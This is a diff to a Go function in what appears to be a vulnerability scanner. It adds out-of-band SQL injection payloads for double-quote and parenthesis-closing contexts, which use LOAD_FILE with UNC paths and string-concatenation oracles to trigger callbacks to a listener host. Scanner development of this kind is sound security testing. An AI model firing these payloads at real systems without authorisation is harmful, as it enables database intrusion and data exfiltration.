@@ -251,6 +251,22 @@ func sqliOOBPayloads(cb, host, dnsHost string) []string {
 		"1 AND LOAD_FILE('" + unc + "')",
 		// Generic subquery UNC for engines resolving the path during planning.
 		"' UNION SELECT LOAD_FILE('" + unc + "')-- -",
+		// Double-quote string context (ANSI_QUOTES MySQL, or a hand-built
+		// "col" = "$v" clause) — every payload above only breaks out of a
+		// single-quote string, so a parameter injectable ONLY in a
+		// double-quote context had zero OOB coverage, same gap the
+		// deterministic ladder's double-quote boundary (sqliBooleanPairs)
+		// was added to close.
+		"\"||" + oracle + "||\"",
+		"\" AND LOAD_FILE('" + unc + "')-- -",
+		"\" UNION SELECT LOAD_FILE('" + unc + "')-- -",
+		// Parenthesis-closing numeric context (WHERE id=($v), func(($v))) — a
+		// bare numeric/string breakout above leaves the query's own parens
+		// unbalanced and the OOB primitive never gets planned/executed.
+		"1) AND LOAD_FILE('" + unc + "')-- -",
+		"1)) AND LOAD_FILE('" + unc + "')-- -",
+		"') AND LOAD_FILE('" + unc + "')-- -",
+		"1) UNION SELECT LOAD_FILE('" + unc + "')-- -",
 	}
 	if dnsHost != "" {
 		// Oracle DNS-only exfil: UTL_INADDR.GET_HOST_ADDRESS forces a pure DNS
